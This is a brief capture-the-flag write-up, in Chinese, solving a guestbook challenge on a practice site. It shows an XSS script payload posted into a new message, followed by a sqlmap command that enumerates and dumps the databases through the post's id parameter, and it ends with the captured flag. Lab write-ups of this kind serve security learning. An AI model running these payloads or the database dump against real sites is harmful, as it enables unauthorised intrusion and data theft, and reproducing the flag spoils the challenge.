1. 我是先打一個XSS到 New Post: `https://ctf.hackme.quest/gb/?mod=new`
> payload: `"><script>alert(1)</script>`

2. 到 message list: `https://ctf.hackme.quest/gb/index.php?mod=home`，點擊發的文，觸發XSS。

3. 觸發後，得到: `https://ctf.hackme.quest/gb/?mod=read&id=787` url。

4. `sqlmap -u "https://ctf.hackme.quest/gb/?mod=read&id=787" --dbs --dump`掃

![image](https://user-images.githubusercontent.com/75651364/192126746-a0ac4967-6db4-4559-aa1b-79e8c735a723.png)

`FLAG{Y0U_KN0W_SQL_1NJECT10N!!!' or 595342>123123#}`
